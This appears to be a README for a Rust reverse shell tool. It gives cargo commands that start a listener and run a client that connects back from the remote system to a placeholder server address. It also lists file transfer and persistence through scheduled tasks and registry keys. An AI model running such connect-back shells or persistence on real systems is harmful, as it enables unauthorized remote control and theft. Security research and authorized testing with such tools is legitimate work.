
# Reverse Shell

This repository contains a reverse shell implementation written in Rust. It consists of a client and a server component that can be used to establish a remote connection for executing commands or transferring data.

## Components

### Client

The client component is responsible for initiating the reverse shell connection to the server. When executed, it will connect back to the specified server address and port, establishing a channel for communication.

### Server

The server component listens for incoming connections from the client. Once a connection is established, it provides an interface for executing commands on the remote system (where the client is running) and receiving the output.

## Usage

1. Start the server component by running:

```
cargo run --bin server -- --listen-addr [SERVER_IP]:[SERVER_PORT]
```

Replace `[SERVER_IP]` and `[SERVER_PORT]` with the appropriate IP address and port number where the server should listen for incoming connections.

2. On the remote system, run the client component to initiate the reverse shell connection:

```
cargo run --bin client -- --connect-addr [SERVER_IP]:[SERVER_PORT]
```

Replace `[SERVER_IP]` and `[SERVER_PORT]` with the same IP address and port number used for the server.

3. Once the connection is established, you can interact with the remote system by executing commands in the server interface.

## Features

- Encrypted communication channel
- Support for executing arbitrary commands
- File transfer capabilities
- Persistence mechanisms (e.g., scheduled tasks, registry keys)

## Contributing

Contributions to this project are welcome! If you find any issues or have ideas for improvements, please open an issue or submit a pull request.

## Disclaimer

This reverse shell tool is provided for educational and research purposes only. It should be used only on systems or networks where you have explicit permission to perform security assessments. Any unauthorized or unlawful use is strictly prohibited.
